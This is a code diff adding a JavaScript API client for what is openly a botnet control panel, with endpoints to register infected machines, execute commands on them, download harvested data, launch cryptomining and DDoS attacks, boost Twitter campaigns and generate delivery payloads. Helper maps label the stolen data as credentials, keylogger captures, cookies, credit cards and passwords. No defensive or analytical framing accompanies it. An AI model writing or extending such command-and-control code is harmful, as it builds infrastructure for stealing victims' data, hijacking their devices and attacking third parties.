@@ -97,4 +97,124 @@ export const securityApi = {
     logActivity: (activityData) => api.post(API_ENDPOINTS.SECURITY.ACTIVITIES, activityData),
 }
 
+//beta app apis
+
+export const botApi = {
+    getAll: () => api.get('/beta/bots/'),
+    getById: (id) => api.get(`/beta/bots/${id}/`),
+    register: (botData) => api.post('/beta/bots/register/', botData),
+    getStats: () => api.post('/beta/bots/stats/'),
+    executeCommand: (botId, commadData) => api.post(
+        `/beta/bots/${botId}/execute_command/`, commadData
+    ),
+    getOnline: () => api.get('/beta/bots/?status=online'),
+    updateStatus: (botId, status) => api.patch(`/beta/bots/${botId}/`, {status}),
+}
+
+export const commandAPI = {
+    getAll: (params = {}) => api.get('/beta/commands/', {params}),
+    getById: (id) => api.get(`/beta/commands/${botId}/`),
+    getPending: (botId) => api.get(`/beta/commands/pending/?bot_id=${botId}`),
+    updateResult: (commandId, resultData) => api.post(`/beta/commands/${commandId}/update_status/`, resultData),
+    create: (commandData) => api.post('/beta/commands/', commandData),
+}   
+
+export const dataApi = {
+    getAll: (params) => api.get('/beta/data/', { params}),
+    getById: (id) => api.get(`/beta/data/${id}/`),
+    download: (id) => api.get(`/beta/data/${id}/download/`),
+    getStats: () => api.get('/data/stats/'),
+}
+
+export const miningApi = {
+    start: (miningData) => api.post('/beta/mining/start/', miningData),
+    stop: (botId) => api.post('/beta/mining/stop/', {bot_id: botId}),
+    getOperations: () => api.get('/beta/mining/'),
+    getStats: () => api.get('/beta/mining/stats/'),
+}
+
+export const ddosApi = {
+    start: (attackData) => api.post('/beta/ddos/start/', attackData),
+    stop: (botId) => api.post('/beta/ddos/stop/', { bot_id: botId}),
+    getAttacks: () => api.get('/beta/ddos/'),
+    getStats: () => api.get('/beta/ddos/stats/')
+}
+
+export const seoApi = {
+    startCampaign: (campaignData) => api.post('/beta/seo/start_campaign/' ,campaignData),
+    boostTwitter: (boostData) => api.post('/beta/seo/boost_twitter/', boostData),
+    getCampaignStats: (campaignName) => api.get(`/beta/seo/campaign_stats/?campaign_name=${campaignName}`),
+    getCampaigns: () => api.get('/beta/seo/'),
+    getStats: () => api.get('/beta/stats/'),
+}
+
+export const deliveryApi = {
+    getAll: () => api.get('/beta/delivery/'),
+    createWebDelivery: (campaignData) => 
+        api.post('/beta/delivery/create_web_delivery/', campaignData),
+    generatePayload: (campaignId, payloadType) => 
+        api.get(`/beta/delivery/generate_payload/?campaign_id=${campaignId}&type=${payloadType}`),
+    getStats: () => api.get('/beta/delivery/stats/'),
+}
+
+export const dashboardApi = {
+    getOverview: () => api.get('/beta/dashboard/stats/'),  // dashboard overview
+    getStats: () => api.get('/beta/dashboard/stats/'),  //systems stats
+    getRecentActivity: () => api.get('/beta/dashboard/recent_activity'),
+}
+
+export const apiUtils = {
+    //format bot platform
+    formatPlatform: (platform) => {
+        const platformMap = {
+            'windows': 'Windows',
+            'linux': 'Linux',
+            'android': 'Android',
+            'ios': 'iOS',
+            'web' :  'Web Browser',
+        }
+        return platformMap[platform] || platform
+    },
+
+    formatCommandStatus: (status) => {
+        const statusMap = {
+            'pending': 'Pending',
+            'executing': 'Executing',
+            'completed': 'Completed',
+            'failed': 'Failed',
+            'timeout': 'Timeout'
+        }
+        return statusMap[status] || status
+    },
+
+    formatDataType: (dataType) => {
+        const typeMap = {
+            'file': 'File',
+            'credentials': 'Credentials',
+            'network': 'Network Info',
+            'system': 'System Info',
+            'browser': 'Browser Data',
+            'keylogger': 'Keylogger Data',
+            'cookies': 'Cookies',
+            'credit_cards': 'Credit Cards',
+            'passwords': 'Passwords',
+        }
+        return typeMap[dataType] || dataType
+    },
+
+    getStatusColor: (status) => {
+        const colorMap = {
+            'online': 'green',
+            'offline': 'red',
+            'busy': 'yellow',
+            'pending': 'blue',
+            'executing': 'yellow',
+            'completed': 'green',
+            'failed': 'red',
+            'timeout': 'orange'
+        }
+        return colorMap[status] || 'gray'
+    }
+}
+
 export default api
